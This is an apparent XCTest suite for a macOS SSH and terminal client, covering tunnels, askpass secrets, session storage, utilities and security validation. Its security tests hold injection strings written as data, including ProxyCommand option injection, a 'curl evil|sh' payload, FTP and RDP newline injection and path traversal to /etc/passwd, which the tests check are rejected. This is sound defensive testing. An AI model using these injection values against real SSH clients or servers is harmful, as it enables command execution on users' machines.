import XCTest
import Network
@testable import ShellDock

final class PureLogicTests: XCTestCase {
    func testShellSplitAndQuote() {
        XCTAssertEqual(ShellSplit.split(#"-o "A B=1" 'x y' c\ d"#), ["-o", "A B=1", "x y", "c d"])
        XCTAssertEqual(ShellSplit.quote("simple"), "simple")
        XCTAssertEqual(ShellSplit.quote("it's"), "'it'\\''s'")
        XCTAssertEqual(ShellSplit.split(ShellSplit.quote("a b'c")), ["a b'c"], "quote/split son inversos")
    }

    func testSnippetExpansionAndSteps() {
        var s = Session(); s.host = "srv"; s.username = "bob"; s.name = "Prod"
        let t = SnippetRunner.expand("echo ${user}@${host} ${session} ${clipboard}", session: s, clipboard: "CLIP")
        XCTAssertEqual(t, "echo bob@srv Prod CLIP")
        XCTAssertEqual(SnippetRunner.steps("ls\n#wait 2\npwd", sendReturn: true), [.text("ls\r"), .wait(2), .text("pwd\r")])
        XCTAssertEqual(SnippetRunner.steps("uptime", sendReturn: false), [.text("uptime")])
    }

    func testPortParsing() {
        XCTAssertEqual(PortScanner.parsePorts("22, 80,8000-8002,80"), [22, 80, 8000, 8001, 8002])
        XCTAssertEqual(PortScanner.parsePorts("3-1"), [1, 2, 3])
        XCTAssertEqual(PortScanner.parsePorts("0,70000,abc"), [])
    }

    func testMagicPacket() {
        let p = WakeOnLAN.magicPacket(mac: "AA:bb:CC:dd:EE:ff")!
        XCTAssertEqual(p.count, 102)
        XCTAssertEqual([UInt8](p.prefix(6)), [UInt8](repeating: 0xFF, count: 6))
        XCTAssertEqual([UInt8](p[6..<12]), [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF])
        XCTAssertEqual([UInt8](p[96..<102]), [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF])
        XCTAssertNil(WakeOnLAN.magicPacket(mac: "12:34"))
    }

    func testTunnelArguments() {
        var t = Tunnel(); t.kind = .local; t.bindPort = 8080; t.targetHost = "db"; t.targetPort = 5432
        XCTAssertEqual(t.sshArguments, ["-L", "127.0.0.1:8080:db:5432"])
        t.kind = .remote
        XCTAssertEqual(t.sshArguments, ["-R", "127.0.0.1:8080:db:5432"])
        t.kind = .dynamic
        XCTAssertEqual(t.sshArguments, ["-D", "127.0.0.1:8080"])
    }

    func testMobaImporterParsing() {
        let s = MobaImporter.parse(name: "web", value: "#109#0%10.1.2.3%2222%deploy%%-1%-1%%%%%0%0%0%", folderID: nil)
        XCTAssertEqual(s?.kind, .ssh)
        XCTAssertEqual(s?.host, "10.1.2.3")
        XCTAssertEqual(s?.port, 2222)
        XCTAssertEqual(s?.username, "deploy")
        XCTAssertNil(MobaImporter.parse(name: "x", value: "#109#0%%22%u%", folderID: nil), "sin host no se importa")
    }
}

final class SSHLauncherTests: XCTestCase {
    func testArgumentsReflectAllOptions() {
        var s = Session()
        s.host = "srv.example"; s.port = 2200; s.username = "ana"
        s.jumpHost = "jump@bastion"; s.x11Forwarding = true; s.x11Trusted = true; s.agentForwarding = true; s.compression = true
        s.keyPath = "/tmp/k"; s.auth = .key; s.keepAlive = 20
        s.tunnels = [Tunnel(name: "t", kind: .local, bindHost: "127.0.0.1", bindPort: 9000, targetHost: "x", targetPort: 80)]
        s.startupCommand = "cd /var/log"
        s.extraArguments = "-o \"Foo=bar baz\""
        let a = SSHLauncher.spec(for: s, settings: AppSettingsData()).args
        func has(_ pair: [String]) -> Bool { a.indices.dropLast(pair.count - 1).contains { Array(a[$0..<($0 + pair.count)]) == pair } }
        XCTAssertTrue(has(["-p", "2200"]) && has(["-l", "ana"]) && has(["-J", "jump@bastion"]) && has(["-i", "/tmp/k"]) && has(["-L", "127.0.0.1:9000:x:80"]))
        XCTAssertTrue(a.contains("-Y") && a.contains("-A") && a.contains("-C") && a.contains("-t"))
        XCTAssertTrue(has(["-o", "Foo=bar baz"]), "argumentos extra con comillas")
        XCTAssertTrue(has(["-o", "ServerAliveInterval=20"]))
        XCTAssertEqual(a[a.count - 2], "srv.example")
        XCTAssertTrue(a.last!.hasPrefix("cd /var/log; exec"), "el comando inicial deja una shell interactiva")
    }

    func testAskpassOnlyWhenSecretStored() {
        var s = Session(); s.host = "h"
        XCTAssertFalse(SSHLauncher.environment(for: s).contains { $0.hasPrefix("SSH_ASKPASS=") })
        s.hasStoredPassword = true
        let env = SSHLauncher.environment(for: s)
        XCTAssertTrue(env.contains("SSH_ASKPASS_REQUIRE=force"))
        XCTAssertTrue(env.contains("SHELLDOCK_ACCOUNT=\(s.id.uuidString)"))
        XCTAssertTrue(FileManager.default.isExecutableFile(atPath: Paths.askpassPath))
    }

    private func runAskpass(env: [String: String], prompt: String) throws -> (String, Int32) {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: Paths.askpassPath)
        p.arguments = [prompt]
        p.environment = env.merging(["PATH": "/usr/bin:/bin", "SHELLDOCK_NODIALOG": "1"]) { a, _ in a }
        let out = Pipe()
        p.standardOutput = out
        p.standardError = Pipe()
        try p.run(); p.waitUntilExit()
        return (String(decoding: out.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self), p.terminationStatus)
    }

    func testAskpassServesSecretsOverPrivateSocket() throws {
        var s = Session(); s.host = "h"; s.hasStoredPassword = true; s.hasStoredPassphrase = true
        Keychain.set("s3cr3t-ñ ✓", account: s.id.uuidString)
        Keychain.set("frase 'de' paso", account: s.id.uuidString + ".passphrase")
        defer { Keychain.delete(account: s.id.uuidString); Keychain.delete(account: s.id.uuidString + ".passphrase") }
        let env = Dictionary(uniqueKeysWithValues: SSHLauncher.environment(for: s).compactMap { kv -> (String, String)? in
            guard let i = kv.firstIndex(of: "=") else { return nil }
            return (String(kv[kv.startIndex..<i]), String(kv[kv.index(after: i)...]))
        })
        XCTAssertNotNil(env["SHELLDOCK_SOCK"]); XCTAssertNotNil(env["SHELLDOCK_TOKEN"])
        // contraseña con caracteres no ASCII, tal cual
        var (out, st) = try runAskpass(env: env, prompt: "usuario@host's password: ")
        XCTAssertEqual(out, "s3cr3t-ñ ✓\n"); XCTAssertEqual(st, 0)
        // frase de paso de la clave
        (out, st) = try runAskpass(env: env, prompt: "Enter passphrase for key '/tmp/k': ")
        XCTAssertEqual(out, "frase 'de' paso\n")
        // token incorrecto: no se entrega nada
        var bad = env; bad["SHELLDOCK_TOKEN"] = "otro"
        (out, st) = try runAskpass(env: bad, prompt: "password: ")
        XCTAssertEqual(out, ""); XCTAssertNotEqual(st, 0)
        // cuenta sin secreto guardado
        var other = env; other["SHELLDOCK_ACCOUNT"] = UUID().uuidString
        (out, st) = try runAskpass(env: other, prompt: "password: ")
        XCTAssertEqual(out, "")
    }
}

@MainActor
final class StoreTests: XCTestCase {
    func tmp() -> URL { FileManager.default.temporaryDirectory.appendingPathComponent("sd-store-\(UUID().uuidString).json") }

    func testNoLimitsAndPersistence() throws {
        let url = tmp()
        defer { try? FileManager.default.removeItem(at: url) }
        let st = SessionStore(url: url)
        var folderIDs: [UUID] = []
        for i in 0..<500 { let f = Folder(name: "Carpeta \(i)", parentID: i > 0 ? folderIDs[i / 2] : nil); folderIDs.append(f.id); st.upsert(folder: f) }
        for i in 0..<5000 { var s = Session(); s.name = "Sesión \(i)"; s.host = "h\(i).example"; s.folderID = folderIDs[i % 500]; st.upsert(session: s) }
        XCTAssertEqual(st.sessions.count, 5000)
        st.save()
        let st2 = SessionStore(url: url)
        XCTAssertEqual(st2.sessions.count, 5000, "5000 sesiones sobreviven al guardado")
        XCTAssertEqual(st2.folders.count, 500)
        XCTAssertEqual(st2.search("h4999").count, 1)
        XCTAssertEqual(st2.childSessions(of: folderIDs[0]).count, 10)
    }

    func testFolderDeletionAndDuplicate() {
        let st = SessionStore(url: tmp())
        let root = Folder(name: "A"), child = Folder(name: "B", parentID: root.id)
        st.upsert(folder: root); st.upsert(folder: child)
        var s = Session(); s.name = "x"; s.folderID = child.id
        st.upsert(session: s)
        st.delete(folder: child.id)
        XCTAssertEqual(st.session(s.id)?.folderID, root.id, "al borrar una carpeta su contenido sube al padre")
        let d = st.duplicate(session: s.id)
        XCTAssertEqual(st.sessions.count, 2)
        XCTAssertNotEqual(d?.id, s.id)
        XCTAssertEqual(st.folderPath(root.id), "A")
    }

    func testExportImportRoundTrip() {
        let a = SessionStore(url: tmp())
        var s = Session(); s.name = "uno"; s.host = "h"
        a.upsert(session: s)
        a.snippets.append(Snippet(name: "sn", text: "ls"))
        let data = a.exportData()!
        let b = SessionStore(url: tmp())
        XCTAssertEqual(b.importData(data), 1)
        XCTAssertEqual(b.sessions.first?.name, "uno")
        XCTAssertEqual(b.snippets.first?.name, "sn")
    }

    func testMobaFileImport() {
        let text = """
        [Bookmarks]
        SubRep=
        ImgNum=42
        [Bookmarks_1]
        SubRep=Producción\\Web
        ImgNum=41
        nginx1=#109#0%web1.example.com%22%deploy%%-1%-1%%%%%0%0%0%
        nginx2=#109#0%web2.example.com%2200%deploy%%-1%-1%%%%%0%0%0%
        [Bookmarks_2]
        SubRep=
        router=#98#1%192.168.1.1%23%%%
        """
        let st = SessionStore(url: tmp())
        XCTAssertTrue(MobaImporter.looksLikeMoba(Data(text.utf8)))
        XCTAssertEqual(MobaImporter.importSessions(Data(text.utf8), into: st), 3)
        let n2 = st.sessions.first { $0.name == "nginx2" }!
        XCTAssertEqual(n2.port, 2200)
        XCTAssertEqual(st.folderPath(n2.folderID), "Producción / Web")
        XCTAssertEqual(st.sessions.first { $0.name == "router" }?.kind, .telnet)
    }
}

@MainActor
final class NetworkAndTunnelTests: XCTestCase {
    func testPortScannerFindsRealListener() async throws {
        let listener = try NWListener(using: .tcp, on: .any)
        listener.newConnectionHandler = { $0.cancel() }
        let ready = expectation(description: "ready")
        listener.stateUpdateHandler = { if case .ready = $0 { ready.fulfill() } }
        listener.start(queue: .global())
        await fulfillment(of: [ready], timeout: 5)
        let port = Int(listener.port!.rawValue)
        defer { listener.cancel() }
        let closed = port == 65000 ? 65001 : 65000
        let found = await PortScanner.scan(host: "127.0.0.1", ports: [port, closed], timeout: 1.0)
        XCTAssertEqual(found, [port])
    }

    func testTunnelForwardsRealTraffic() async throws {
        try TestServer.skipIfUnavailable()
        let mgr = TunnelManager()
        var t = SavedTunnel()
        t.sessionID = UUID()
        t.tunnel = Tunnel(name: "t", kind: .local, bindHost: "127.0.0.1", bindPort: 23333, targetHost: "127.0.0.1", targetPort: TestServer.port)
        mgr.start(t, session: TestServer.session(), hostKeyPolicy: "no")
        var running = false
        for _ in 0..<100 { if mgr.state(t.id) == .running { running = true; break }; try await Task.sleep(nanoseconds: 100_000_000) }
        XCTAssertTrue(running, "estado: \(mgr.state(t.id))")
        // a través del túnel llega el banner del sshd de pruebas
        let c = TCPTransport(host: "127.0.0.1", port: 23333)
        var got = ""
        c.onData = { got += String(decoding: $0, as: UTF8.self) }
        c.open()
        for _ in 0..<50 where !got.contains("SSH-2.0") { try await Task.sleep(nanoseconds: 100_000_000) }
        XCTAssertTrue(got.contains("SSH-2.0"), "banner recibido por el túnel: \(got)")
        c.close()
        mgr.stop(t.id)
        XCTAssertEqual(mgr.state(t.id), .stopped)
    }

    func testTunnelFailureIsReported() async throws {
        let mgr = TunnelManager()
        var t = SavedTunnel(); t.sessionID = UUID()
        t.tunnel = Tunnel(name: "malo", kind: .local, bindHost: "127.0.0.1", bindPort: 23334, targetHost: "x", targetPort: 1)
        var s = TestServer.session(); s.port = 1       // nadie escucha
        mgr.start(t, session: s, hostKeyPolicy: "no")
        for _ in 0..<80 { if case .failed = mgr.state(t.id) { break }; try await Task.sleep(nanoseconds: 100_000_000) }
        guard case .failed(let msg) = mgr.state(t.id) else { return XCTFail("debería fallar: \(mgr.state(t.id))") }
        XCTAssertFalse(msg.isEmpty)
    }
}

final class KeysTests: XCTestCase {
    func testGenerateListAndFingerprint() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("sd-keys-\(UUID().uuidString)").path
        defer { try? FileManager.default.removeItem(atPath: dir) }
        let (ok, out) = SSHKeys.generate(name: "id_test", type: "ed25519", bits: nil, comment: "prueba@shelldock", passphrase: "", in: dir)
        XCTAssertTrue(ok, out)
        let keys = SSHKeys.list(in: dir)
        XCTAssertEqual(keys.count, 1)
        XCTAssertEqual(keys[0].type, "ED25519")
        XCTAssertTrue(keys[0].fingerprint.hasPrefix("SHA256:"))
        XCTAssertEqual(keys[0].comment, "prueba@shelldock")
        XCTAssertTrue(SSHKeys.publicKey(keys[0])!.hasPrefix("ssh-ed25519 "))
        XCTAssertFalse(SSHKeys.generate(name: "id_test", type: "ed25519", bits: nil, comment: "", passphrase: "", in: dir).0, "no sobrescribe")
        let attrs = try FileManager.default.attributesOfItem(atPath: dir + "/id_test")
        XCTAssertEqual((attrs[.posixPermissions] as? NSNumber)?.intValue, 0o600, "clave privada con permisos 600")
    }
}

final class HighlightAndMacroTests: XCTestCase {
    func testHighlightsPlainErrorsAndIPs() {
        let out = String(decoding: KeywordHighlighter.process(Array("ERROR: host 10.0.0.1 is up\r\n".utf8)), as: UTF8.self)
        XCTAssertTrue(out.contains("\u{1b}[1;31mERROR\u{1b}[0m"))
        XCTAssertTrue(out.contains("\u{1b}[35m10.0.0.1\u{1b}[0m"))
        XCTAssertTrue(out.contains("\u{1b}[32mup\u{1b}[0m"))
    }

    func testLeavesFullScreenSequencesAlone() {
        let raw = Array("\u{1b}[2J\u{1b}[Herror".utf8)
        XCTAssertEqual(KeywordHighlighter.process(raw), raw)
    }

    func testKeepsExistingColorsAndHighlightsOutsideThem() {
        let out = String(decoding: KeywordHighlighter.process(Array("\u{1b}[34mdir\u{1b}[0m failed".utf8)), as: UTF8.self)
        XCTAssertTrue(out.hasPrefix("\u{1b}[34mdir\u{1b}[0m"))
        XCTAssertTrue(out.contains("\u{1b}[1;31mfailed"))
    }

    func testMacroTextHandlesBackspaceAndArrows() {
        let bytes: [UInt8] = Array("ls -x".utf8) + [0x7F] + Array("l\r".utf8) + [0x1B, 0x5B, 0x41] + Array("pwd\r".utf8)
        XCTAssertEqual(MacroRecorder.text(from: bytes), "ls -l\npwd")
    }

    func testSettingsDecodeOldFileWithoutNewKeys() throws {
        let old = #"{"fontName":"Monaco","fontSize":15}"#.data(using: .utf8)!
        let s = try JSONDecoder().decode(AppSettingsData.self, from: old)
        XCTAssertEqual(s.fontName, "Monaco"); XCTAssertEqual(s.fontSize, 15)
        XCTAssertTrue(s.highlightKeywords); XCTAssertEqual(s.scrollback, 20000)
    }
}

final class RemoteMonitorTests: XCTestCase {
    func testParse() {
        let r = RemoteStats.parse("L=0.52 0.40 0.30\nM=7943 2381\nD=100 50 47%\nU=up 3 days, 2 hours\nN=8\n")
        XCTAssertEqual(r.load, "0.52 0.40 0.30"); XCTAssertEqual(r.memPercent, 29)
        XCTAssertEqual(r.diskPercent, "47%"); XCTAssertEqual(r.cpus, 8); XCTAssertEqual(r.uptime, "up 3 days, 2 hours")
    }

    func testLiveAgainstTestServer() throws {
        try TestServer.skipIfUnavailable()
        let r = try XCTUnwrap(RemoteMonitor.fetch(TestServer.session(), hostKeyPolicy: "no"))
        XCTAssertGreaterThan(r.cpus, 0); XCTAssertFalse(r.load.isEmpty); XCTAssertTrue(r.diskPercent.hasSuffix("%"))
    }
}

final class UtilitiesTests: XCTestCase {
    func testPasswordRespectsLengthAndClasses() {
        let p = Utilities.password(length: 24)
        XCTAssertEqual(p.count, 24)
        XCTAssertTrue(p.contains { $0.isUppercase }); XCTAssertTrue(p.contains { $0.isLowercase }); XCTAssertTrue(p.contains { $0.isNumber })
        XCTAssertTrue(Utilities.password(length: 30, upper: false, lower: false, digits: true, symbols: false).allSatisfy { $0.isNumber })
        XCTAssertNotEqual(Utilities.password(length: 24), Utilities.password(length: 24))
    }

    func testHashesKnownVectors() {
        let h = Dictionary(uniqueKeysWithValues: Utilities.hashes(of: Data("abc".utf8)))
        XCTAssertEqual(h["MD5"], "900150983cd24fb0d6963f7d28e17f72")
        XCTAssertEqual(h["SHA-1"], "a9993e364706816aba3e25717850c26c9cd0d89d")
        XCTAssertEqual(h["SHA-256"], "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")
    }

    func testEncodings() {
        XCTAssertEqual(Utilities.base64Encode("hola"), "aG9sYQ==")
        XCTAssertEqual(Utilities.base64Decode("aG9sYQ=="), "hola")
        XCTAssertEqual(Utilities.urlEncode("a b&c"), "a%20b%26c")
        XCTAssertEqual(Utilities.hexDecode(Utilities.hexEncode("añ")), "añ")
        XCTAssertNil(Utilities.hexDecode("zz"))
    }

    func testSubnet() {
        let s = Utilities.subnet("192.168.1.77/24")
        XCTAssertEqual(s?.network, "192.168.1.0"); XCTAssertEqual(s?.broadcast, "192.168.1.255")
        XCTAssertEqual(s?.mask, "255.255.255.0"); XCTAssertEqual(s?.first, "192.168.1.1"); XCTAssertEqual(s?.last, "192.168.1.254")
        XCTAssertEqual(s?.hosts, 254)
        XCTAssertEqual(Utilities.subnet("10.0.0.0/8")?.hosts, 16_777_214)
        XCTAssertEqual(Utilities.subnet("10.0.0.1/32")?.hosts, 1)
        XCTAssertNil(Utilities.subnet("300.0.0.0/8")); XCTAssertNil(Utilities.subnet("1.2.3.4/33"))
    }

    func testEpoch() { XCTAssertTrue(Utilities.epochToDate("0")?.contains("1970-01-01T00:00:00Z") == true) }

    func testMasterPasswordDerivation() {
        let salt = [UInt8](repeating: 7, count: 16)
        XCTAssertEqual(MasterPassword.derive("x", salt: salt, rounds: 10), MasterPassword.derive("x", salt: salt, rounds: 10))
        XCTAssertNotEqual(MasterPassword.derive("x", salt: salt, rounds: 10), MasterPassword.derive("y", salt: salt, rounds: 10))
    }
}

final class HTTPServerTests: XCTestCase {
    func testResponsesAndTraversalProtection() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("sd-http-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: root.appendingPathComponent("sub"), withIntermediateDirectories: true)
        try "hola".write(to: root.appendingPathComponent("a.txt"), atomically: true, encoding: .utf8)
        let r = root.standardizedFileURL.resolvingSymlinksInPath()
        let ok = HTTPFileServer.response(for: "/a.txt", root: r)
        XCTAssertEqual(ok.0, "200 OK"); XCTAssertEqual(String(data: ok.2, encoding: .utf8), "hola"); XCTAssertTrue(ok.1.hasPrefix("text/plain"))
        XCTAssertTrue(String(data: HTTPFileServer.response(for: "/", root: r).2, encoding: .utf8)!.contains("a.txt"))
        XCTAssertEqual(HTTPFileServer.response(for: "/nope", root: r).0, "404 Not Found")
        XCTAssertEqual(HTTPFileServer.response(for: "/../../etc/passwd", root: r).0, "403 Forbidden")
        XCTAssertEqual(HTTPFileServer.response(for: "/%2e%2e/%2e%2e/etc/passwd", root: r).0, "403 Forbidden")
    }

    @MainActor func testLiveServer() async throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("sd-http2-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        try "contenido".write(to: root.appendingPathComponent("f.txt"), atomically: true, encoding: .utf8)
        let srv = HTTPFileServer()
        try srv.start(folder: root, port: 28080)
        defer { srv.stop() }
        for _ in 0..<50 where !srv.running { try await Task.sleep(nanoseconds: 100_000_000) }
        let (data, resp) = try await URLSession.shared.data(from: URL(string: "http://127.0.0.1:28080/f.txt")!)
        XCTAssertEqual((resp as? HTTPURLResponse)?.statusCode, 200)
        XCTAssertEqual(String(data: data, encoding: .utf8), "contenido")
    }
}

@MainActor
final class StoreCompatTests: XCTestCase {
    func testRightClickPasteDefaultsOnForOldSettings() throws {
        let old = try JSONDecoder().decode(AppSettingsData.self, from: Data(#"{"fontSize":14}"#.utf8))
        XCTAssertTrue(old.rightClickPaste)
        let off = try JSONDecoder().decode(AppSettingsData.self, from: Data(#"{"rightClickPaste":false}"#.utf8))
        XCTAssertFalse(off.rightClickPaste)
    }

    func tmp() -> URL { FileManager.default.temporaryDirectory.appendingPathComponent("sd-store-\(UUID().uuidString).json") }

    func testOldFileMissingNewFieldsStillLoads() throws {
        let url = tmp()
        let old = #"{"sessions":[{"id":"0B2F6C1A-0000-4000-8000-000000000001","name":"viejo","host":"h","kind":"ssh"}],"folders":[],"snippets":[],"savedTunnels":[],"version":1}"#
        try old.write(to: url, atomically: true, encoding: .utf8)
        let s = SessionStore(url: url)
        XCTAssertEqual(s.sessions.count, 1); XCTAssertEqual(s.sessions[0].name, "viejo")
        XCTAssertEqual(s.sessions[0].keepAlive, 30, "los campos que faltan toman su valor por defecto")
    }

    func testCorruptFileIsBackedUpNotOverwritten() throws {
        let url = tmp()
        try "{ esto no es json".write(to: url, atomically: true, encoding: .utf8)
        let s = SessionStore(url: url)
        XCTAssertTrue(s.sessions.isEmpty)
        let dir = url.deletingLastPathComponent()
        let backups = try FileManager.default.contentsOfDirectory(atPath: dir.path).filter { $0.hasPrefix("sessions.corrupt-") }
        XCTAssertFalse(backups.isEmpty, "se guarda una copia del archivo ilegible")
        backups.forEach { try? FileManager.default.removeItem(at: dir.appendingPathComponent($0)) }
    }

    func testBadElementDoesNotDropTheRest() throws {
        let url = tmp()
        let json = #"{"sessions":[{"name":"ok"},{"name":5,"kind":"inventado"},{"name":"ok2"}]}"#
        try json.write(to: url, atomically: true, encoding: .utf8)
        XCTAssertEqual(SessionStore(url: url).sessions.map(\.name), ["ok", "ok2"])
    }

    func testSavedFileIsOwnerOnly() async throws {
        let url = tmp()
        let s = SessionStore(url: url)
        s.sessions.append(Session())
        try await Task.sleep(nanoseconds: 900_000_000)
        let perms = try FileManager.default.attributesOfItem(atPath: url.path)[.posixPermissions] as? Int
        XCTAssertEqual(perms, 0o600)
    }
}

final class MiniLinuxScriptTests: XCTestCase {
    func testInitScriptHasValidShellSyntax() throws {
        let f = FileManager.default.temporaryDirectory.appendingPathComponent("sd-init-\(UUID().uuidString).sh")
        try MiniLinuxPersistence.initScript.write(to: f, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: f) }
        let p = Process(); p.executableURL = URL(fileURLWithPath: "/bin/sh"); p.arguments = ["-n", f.path]
        let err = Pipe(); p.standardError = err; try p.run(); p.waitUntilExit()
        XCTAssertEqual(p.terminationStatus, 0, String(decoding: err.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self))
    }

    func testSetupLineMountsBothSharesAndSizesTerminal() {
        let l = MiniLinuxPersistence.setupLine(cols: 120, rows: 40)
        XCTAssertTrue(l.contains("stty cols 120 rows 40")); XCTAssertTrue(l.contains("mount -t virtiofs persist /persist"))
        XCTAssertTrue(l.contains("mount -t virtiofs mac /mnt/mac"))
    }
}

@MainActor
final class SecurityTests: XCTestCase {
    func testOptionInjectionInHostOrUserIsRejected() {
        for h in ["-oProxyCommand=touch /tmp/pwn", "-J", "host name", "a;b", "host\nProxyCommand x", "ho$(id)st", ""] {
            var s = Session(); s.kind = .ssh; s.host = h
            XCTAssertNotNil(s.validationError, "host «\(h)» debe rechazarse")
        }
        var u = Session(); u.host = "ok.example.com"; u.username = "-oProxyCommand=x"
        XCTAssertNotNil(u.validationError)
        var j = Session(); j.host = "ok.example.com"; j.jumpHost = "-oProxyCommand=x"
        XCTAssertNotNil(j.validationError)
        var good = Session(); good.host = "db-1.corp.example.com"; good.username = "admin@corp"
        XCTAssertNil(good.validationError)
        var v6 = Session(); v6.host = "[fe80::1%en0]"
        XCTAssertNil(v6.validationError)
    }

    func testDoubleDashPrecedesHostInEverySSHInvocation() {
        var s = TestServer.session(); s.host = "example.org"
        let spec = SSHLauncher.spec(for: s, settings: AppSettingsData())
        XCTAssertEqual(spec.args.suffix(2), ["--", "example.org"])
        let sftp = SSHLauncher.sftpSubsystemArguments(s, hostKeyPolicy: "accept-new")
        XCTAssertEqual(Array(sftp.suffix(4)), ["-s", "--", "example.org", "sftp"])
    }

    func testMaliciousSSHURLsAreRejected() {
        let app = AppState(store: SessionStore(url: FileManager.default.temporaryDirectory.appendingPathComponent("sd-\(UUID()).json")), settings: AppSettings(url: FileManager.default.temporaryDirectory.appendingPathComponent("st-\(UUID()).json")))
        for url in ["ssh://-oProxyCommand=calc@host", "ssh://user@-oProxyCommand=calc", "ssh://-F/etc/passwd"] {
            let s = app.parseQuick(url)?.sanitizedForImport()
            XCTAssertNotNil(s?.validationError, url)
        }
        let ok = app.parseQuick("ssh://ana@srv.example.com:2200/ruta")
        XCTAssertEqual(ok?.host, "srv.example.com"); XCTAssertEqual(ok?.port, 2200); XCTAssertNil(ok?.validationError)
    }

    func testImportedSessionsLoseDangerousOptions() {
        var s = Session(); s.extraArguments = "-oProxyCommand=curl evil|sh"; s.sharedFolder = "/Users"; s.name = "x\u{0}y"
        let c = s.sanitizedForImport()
        XCTAssertEqual(c.extraArguments, ""); XCTAssertEqual(c.sharedFolder, ""); XCTAssertEqual(c.name, "xy")
        let store = SessionStore(url: FileManager.default.temporaryDirectory.appendingPathComponent("sd-\(UUID()).json"))
        var raw = Session(); raw.extraArguments = "-oProxyCommand=evil"; raw.host = "h"
        let data = try! JSONEncoder().encode(StoreData(sessions: [raw]))
        XCTAssertEqual(store.importData(data), 1)
        XCTAssertEqual(store.sessions.first?.extraArguments, "")
    }

    func testRemoteNamesCannotEscapeDownloadFolder() {
        for bad in ["..", ".", "", "../etc/passwd", "a/b", "x\ny", "a\0b", "x\r\ny"] { XCTAssertFalse(SessionSafety.isSafeRemoteName(bad), bad) }
        for good in ["file.txt", "con espacios.txt", ".hidden", "ñandú"] { XCTAssertTrue(SessionSafety.isSafeRemoteName(good), good) }
        let listing = "-rw-r--r--   1 u g 10 Jan  1 12:00 ../../evil\n-rw-r--r--   1 u g 10 Jan  1 12:00 ok.txt"
        XCTAssertEqual(FTPClient.parseListing(listing, in: "/").map(\.name), ["ok.txt"])
    }

    func testFTPCommandInjectionBlocked() {
        XCTAssertFalse(SessionSafety.isSafeFTPPath("/a\r\nDELE /important"))
        XCTAssertTrue(SessionSafety.isSafeFTPPath("/a/b c.txt"))
    }

    func testRDPFileCannotBeInjectedWithNewlines() {
        var s = Session(); s.kind = .rdp; s.host = "10.0.0.1\r\nalternate shell:s:cmd.exe"; s.username = "u\nenablecredsspsupport:i:0"
        let c = RDPLauncher.contents(for: s)
        XCTAssertFalse(c.contains("\nalternate shell"), c); XCTAssertFalse(c.contains("\nenablecredsspsupport"), c)
    }

    func testNetworkToolsRejectOptionLikeHosts() {
        XCTAssertEqual(NetworkTool.ping.command(host: "-f 127.0.0.1").0, "/bin/echo")
        XCTAssertEqual(NetworkTool.dns.command(host: "+short").0, "/bin/echo")
        XCTAssertEqual(NetworkTool.ping.command(host: "example.com").0, "/sbin/ping")
    }

    func testBrowserSessionOnlyHTTP() {
        var s = Session(); s.kind = .browser; s.host = "file:///etc/passwd"
        XCTAssertNotNil(s.validationError)
        s.host = "https://panel.example.com"; XCTAssertNil(s.validationError)
    }

    func testControlDirIsPrivateAndOwned() {
        let d = Paths.controlDir
        var st = stat(); XCTAssertEqual(lstat(d, &st), 0)
        XCTAssertEqual(st.st_uid, getuid()); XCTAssertEqual(st.st_mode & 0o777, 0o700)
    }

    func testHTTPServerLoopbackByDefault() async throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("sd-http3-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let srv = HTTPFileServer()
        try srv.start(folder: root, port: 28081)       // localOnly por defecto
        defer { srv.stop() }
        for _ in 0..<50 where !srv.running { try await Task.sleep(nanoseconds: 100_000_000) }
        XCTAssertTrue(srv.running)
        let (_, resp) = try await URLSession.shared.data(from: URL(string: "http://127.0.0.1:28081/")!)
        XCTAssertEqual((resp as? HTTPURLResponse)?.statusCode, 200)
    }
}

final class HostScannerTests: XCTestCase {
    func testAddressRange() {
        XCTAssertEqual(HostScanner.addresses(cidr: "192.168.1.0/30"), ["192.168.1.1", "192.168.1.2"])
        XCTAssertEqual(HostScanner.addresses(cidr: "10.0.0.5/32"), ["10.0.0.5"])
        XCTAssertEqual(HostScanner.addresses(cidr: "10.0.0.0/24")?.count, 254)
        XCTAssertNil(HostScanner.addresses(cidr: "10.0.0.0/8"), "barridos enormes rechazados")
        XCTAssertNil(HostScanner.addresses(cidr: "nada"))
    }

    func testParseARP() {
        let m = HostScanner.parseARP("? (192.168.1.1) at aa:bb:cc:dd:ee:ff on en0 ifscope [ethernet]\n? (192.168.1.9) at (incomplete) on en0 ifscope [ethernet]\n")
        XCTAssertEqual(m, ["192.168.1.1": "aa:bb:cc:dd:ee:ff"])
    }

    func testLiveScanFindsLoopback() async {
        let found = await HostScanner.scan(cidr: "127.0.0.1/32")
        XCTAssertEqual(found.map(\.ip), ["127.0.0.1"])
    }
}

final class LocalizationTests: XCTestCase {
    static let root = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
    static var resources: URL { root.appendingPathComponent("Resources/Localization") }
    let codes = ["en", "es", "fr", "it", "de", "pt"]

    func table(_ code: String, _ name: String = "Localizable") throws -> [String: String] {
        let url = Self.resources.appendingPathComponent("\(code).lproj/\(name).strings")
        return try XCTUnwrap(NSDictionary(contentsOf: url) as? [String: String], "falta \(url.path); ejecuta tools/i18n_build.py")
    }

    func testAllLanguagesHaveTheSameKeysAndPlaceholders() throws {
        let base = try table("es")
        XCTAssertGreaterThan(base.count, 300)
        for c in codes {
            let t = try table(c)
            XCTAssertEqual(Set(t.keys), Set(base.keys), "claves distintas en \(c)")
            for (k, v) in t {
                XCTAssertEqual(v.components(separatedBy: "%@").count, k.components(separatedBy: "%@").count, "marcadores en \(c): \(k)")
                XCTAssertFalse(v.isEmpty, "\(c): vacío para \(k)")
            }
        }
    }

    /// Todo tr("…") del código debe tener traducción: evita que vuelvan a aparecer textos sin localizar.
    func testEveryTrKeyInSourceIsTranslated() throws {
